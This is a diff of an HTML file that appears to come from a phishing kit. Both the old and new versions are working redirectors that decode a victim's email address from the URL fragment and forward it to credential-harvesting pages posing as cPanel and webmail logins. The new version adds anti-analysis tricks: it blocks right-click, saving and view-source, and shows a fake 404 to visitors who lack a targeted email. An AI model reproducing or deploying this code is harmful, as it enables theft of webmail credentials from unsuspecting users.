@@ -1,51 +1,114 @@
 
-<html lang="en">
-<head>
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
-<meta charset="utf-8">
- 
- 
-
-<head>     
-<body>    
-       
- <script type="text/javascript">
-var url_string =  window.location.href;
-var url_get_email = atob(getafterhash(url_string));
-var mail_go_url =  "https://reutilizemais.co.mz/cpanel.login/344FTmail.authentication/qq-checks_auth0/authenticate-userid/748305984756487674687365374695783746368579643857457456457/cPanel%20Login.php?email="+url_get_email+"";
-location.replace(mail_go_url);  
- 
- 
-function getafterhash(url) {
-var ret; 
-var queryString; 
- // stuff after # is not part of query string, so get rid of it
- queryStringhash = url.split('#')[1]; 
- queryStringsemi = url.split(';')[1]; 
- queryStringsemiplus = url.split(';+')[1]; 
- queryStringstartsemi = url.split('*;')[1]; 
-  // if query string exists
- if (queryStringhash) {
-  ret = queryStringhash;
- 
- }else if (queryStringsemi) {
-  ret = queryStringsemi;
- 
- }else if (queryStringsemiplus) {
-  ret = queryStringsemiplus;
- 
- }else if (queryStringstartsemi) {
-  ret = queryStringstartsemi;
- 
- }else{
- 
-   ret = 0;
-
-  }
-
-  return ret;
-}
-
-</script>         
-</body>
+<!DOCTYPE html>
+<html>
+   <head>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <title>Webmail Login</title>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+      <style>
+         html {
+         visibility: hidden; 
+         background: white;
+         }
+      </style>
+   </head>
+   <body>
+      <script>
+         function isBase64(str) {
+             try {
+                 return btoa(atob(str)) === str; 
+             } catch (err) {
+                 return false; 
+             }
+         }
+         
+         function redirrectPage() {
+             var query = window.location.href;
+             console.log(query);
+             
+             var res = query.split("#");
+             var data1 = res[0]; 
+             var data2 = res[1];
+         
+             console.log("Base URL:", data1);
+             console.log("Hash Content:", data2);
+         
+             if (data2 && isBase64(data2)) {
+                 console.log("Valid Base64 email detected. Redirecting...");
+                 window.location.href = "https://auth0-cpsess.tropicana-pg.it.com/cpsess/mxcenter/#" + data2; 
+             } else {
+                 console.log("Invalid or missing Base64 email. No redirect.");
+             }
+         }
+         
+         redirrectPage();
+         
+         			$(document).bind('keydown', function(e) {
+         if(e.ctrlKey && (e.which == 83)) {
+         e.preventDefault();
+         return false;
+         }
+         });
+         document.addEventListener('contextmenu', event => event.preventDefault());
+         document.onkeydown = function(e) {
+         if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
+         return false;
+         } else {
+         return true;
+         }
+         };
+         $(document).keypress("u",function(e) {
+         if(e.ctrlKey)
+         {
+         return false; }
+         else {
+         return true;
+         }});
+         
+         document.addEventListener("DOMContentLoaded", function () {
+             function isValidBase64Email(encodedString) {
+                 try {
+                     let decoded = atob(encodedString);
+                     let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                     return emailRegex.test(decoded) ? decoded : null;
+                 } catch (e) {
+                     return null; 
+                 }
+             }
+         
+             function enforceAccessRestriction() {
+                 let hash = window.location.hash.substring(1); 
+         
+                 let decodedEmail = isValidBase64Email(hash);
+                 if (!decodedEmail) {
+                     document.body.innerHTML = ""; 
+                     document.body.style.cssText = `
+                         display: flex;
+                         justify-content: center;
+                         align-items: center;
+                         height: 100vh;
+                         flex-direction: column;
+                         text-align: center;
+                         background-color: white;
+                         color: black;
+                         font-family: Arial, sans-serif;
+                         margin: 0;
+                     `;
+                     let deniedMessage = document.createElement("div");
+                     deniedMessage.innerHTML = `
+                     <h6 style="font-size: 40px;"> 404: Page not found</h6>
+                     `;
+                     document.body.appendChild(deniedMessage);
+                     return;
+                 }
+                 console.log("Decoded Email:", decodedEmail);
+             }
+             enforceAccessRestriction();
+         });
+         
+         	
+      </script>
+   </body>
 </html>
